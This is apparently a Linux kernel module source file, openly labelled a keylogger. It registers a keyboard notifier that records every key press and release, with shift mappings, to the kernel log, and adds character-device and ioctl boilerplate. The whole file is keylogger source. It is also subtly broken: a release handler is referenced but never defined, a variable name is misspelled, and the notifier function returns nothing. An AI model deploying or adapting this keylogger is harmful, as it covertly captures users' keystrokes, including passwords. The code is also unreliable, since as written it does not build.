#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#include "keylogger.h"

#define SUCCESS 0
#define DEVICE_NAME "keylog"
#define BUF_LEN 80

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tanner Hoelzel");
MODULE_DESCRIPTION("A keylogging module");

/*
 * Is device open now? (prevents concurrent access)
 */
static int Device_Open = 0;

/*
 * The message the device will give when asked 
 */
static char Message[BUF_LEN];

/*
 * How far did we get in reading the message? (useful if message larger than buffer)
 */
static char *Message_Ptr;

/*
 * A map where index represents keycode
 */
static const char* keymap[] =
	{	"ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9",
		"0", "-", "=", "BS", "TAB", "q", "w", "e", "r", "t",
		"y", "u", "i", "o", "p", "[", "]", "ENTER", "LCTRL", "a",
		"s", "d", "f", "g", "h", "j", "k", "l", ";", "'",
		"`", "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m",
		",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPSLOCK", "F1", "F2",
		"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLOCK",
		"HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", "DOWN",
		"PGDN", "INS", "DEL", "\0", "\0", "\0", "F11", "F12", "\0", "\0", 
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

/*
 * A map where index represents keycode
 */
static const char* keymapShift[] =
	{	"ESC", "!", "@", "#", "$", "%%", "^", "&", "*", "(",
		")", "_", "+", "BS", "TAB", "Q", "W", "E", "R", "T",
		"Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A",
		"S", "D", "F","G", "H", "J", "K", "L", ":", "\"",
		"~", "LSHIFT", "|", "Z", "X", "C", "V", "B", "N", "M",
		"<", ">","?", "RSHIFT", "*", "\0", " ", "CAPSLOCK", "_F1_", "_F2_",
		"_F3_", "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_",
		"_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5", "_RTARROW_", "+", "_END_", "_DOWN_",
		"_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_", "\0", "\0",
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

/*
 * Called when a process attempts to open device file
 *
 * returns: success/failure
 * inode:
 * file:
 */
static int device_open(struct inode *inode, struct file *file)
{
#ifdef DEBUG
	printk(KERN_INFO "device_open(%p)\n", file);
#endif

	/* Don't talk to 2 processes at the same time */
	if(Device_Open) return -EBUSY;
	Device_Open++;
	
	/* Initialize the message */
	Message_Ptr = Message;
	try_module_get(THIS_MODULE);
	return SUCCESS;
}

/*
 * Called when a process (who's already opened the device file) tries to read from it
 *
 * returns:
 * file:
 * buffer:
 * length:
 * offset:
 */
static ssize_t device_read(struct file *file,
			   char __user * buffer,
			   size_t length,
			   loff_t *offset)
{
	/* Number of bytes actually written to the buffer */
	int bytes_read = 0;

#ifdef DEBUG
	printk(KERN_INFO "device_read(%p,%p,%d)\n", file, buffer, length);
#endif

	/* If we're at end of message, signify EOF */ 
	if(*Message_Ptr == 0) return 0;

	/* Put the data into the buffer */
	while(length && *Message_Ptr) {
		/*
		 * Buffer is in user data segment (not kernel so assignment wouldn't work)
		 * We have to use put_user (copies data from kernel segment to user segment)
		 */
		put_user(*(Message_Ptr++), buffer++);
		length--;
		bytes_read++;
	}

#ifdef DEBUG
	printk(KERN_INFO "Read %d bytes, %d left\n", bytes_read, length);
#endif

	/* Read functions should return number of bytes inserted into buffer */
	return bytes_read;
}

/*
 * Called when somebody tries to write into device file
 */
static ssize_t
device_write(struct file *file,
	     const char __user * buffer,
	     size_t length,
	     loff_t *offset)
{
	int i;

#ifdef DEBUG
	printk(KERN_INFO "device_write(%p,%s,%d)", file, buffer, length);
#endif

	for(i = 0; i < length && i < BUF_LEN; i++)
		get_user(Message[i], buffer + i);

	Message_Ptr = Message;

	/* Return number of input characters used */
	return i;
}

/*
 * Called whenever a process tries to do ioctl on device file.
 * If the ioctl is write or read/write (meaning output is returned
 * to the calling process), the ioctl call returns the output of this function.
 * 
 * inode:
 * file:
 * ioctl_num: number of the ioctl called
 * ioctl_param: param to give to ioctl function
 */
int device_ioctl(struct inode *inode,
		 struct file *file,
		 unsigned int ioctl_num,
		 unsigned long ioctl_param)
{
	int i;
	char *temp;
	char ch;

	/* Switch according to the ioctl called */
	switch(ioctl_num) {
		case IOCTL_SET_MSG:
			/*
			 * Receive a ptr to a message (user space),
			 * set that to be device's message.
			 * Get param given to ioctl by process.
			 */
			temp = (char *) ioctl_param;

			/* Find message length */
			get_user(ch, temp);
			for(i = 0; ch && i < BUF_LEN; i++, temp++)
				get_user(ch, temp);

			device_write(file, (char *)ioctl_param, i, 0);
			break;

		case IOCTL_GET_MSG:
			/*
			 * Give the current message to the calling process:
			 * the parameter we received is a ptr; fill it.
			 */
			i = device_read(file, (char *)ioctl_param, 99, 0);

			/* Properly terminate buffer */
			put_user('\0', (char *)ioctl_param + i);
			break;

		case IOCTL_GET_NTH_BYTE:
			/*
			 * This ioctl is both input (ioctl_param) and
			 * output (the return value of this function)
			 */
			return Message[ioctl_param];
			break;
	}

	return SUCCESS;
}

/*
 * Holds functions to be called when a process does sthg to created device.
 * Since a ptr to this struct is kept in devices table, it can't be local to init_module.
 */
struct file_operations Fops = {
	.read = device_read,
	.write = device_write,
	.ioctl = device_ioctl,
	.open = device_open,
	.release = device_release,
};

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	int shift = (param->value == 42)||(param->value == 54);

	if(code == KBD_KEYCODE) {
		if(shift) {
			printk(KERN_INFO "KEYLOGGER %s %s\n", keymapShift[(param->value)-1], (param->down ? "down": "up"));
		} else {
			printk(KERN_INFO "KEYLOGGER %s %s\n", keymap[(param->value)-1], (param->down ? "down": "up"));
		}
	}
}

static struct notifier_block nb = {
	.notifier_call = hello_notify
};

static int __init keylogger_init(void)
{
	/* Register the character device */
	int  ret_val;
	ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &Fops);

	/* Signify error */
	if(ret_val < 0) {
		printk(KERN_ALERT "Registering character device failed with %d\n", retval);
		return ret_val;
	}
	printk(KERN_INFO "Device registered. The major device number is %d.\n", MAJOR_NUM);
	printk(KERN_INFO "If you want to talk to the device driver,\n");
	printk(KERN_INFO "you'll have to create a device file. \n");
	printk(KERN_INFO "We suggest you use:\n");
	printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
	printk(KERN_INFO "The device file name is important, because\n");
	printk(KERN_INFO "the ioctl program assumes that's the\n");
	printk(KERN_INFO "file you'll use.\n");

	/* Register the keyboard notifier */
	register_keyboard_notifier(&nb);
	printk(KERN_INFO "Keyboard notifier registered");
	
	return 0;
}

static void __exit keylogger_cleanup(void)
{
	int ret;

	/* Unregister the character device */
	ret = unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
	if(ret < 0) printk(KERN_ALERT "Error: unregister_chrdev: %d\n", ret);

	/* Unregister the keyboard notifier */
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keyboard notifier unregistered\n");
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);
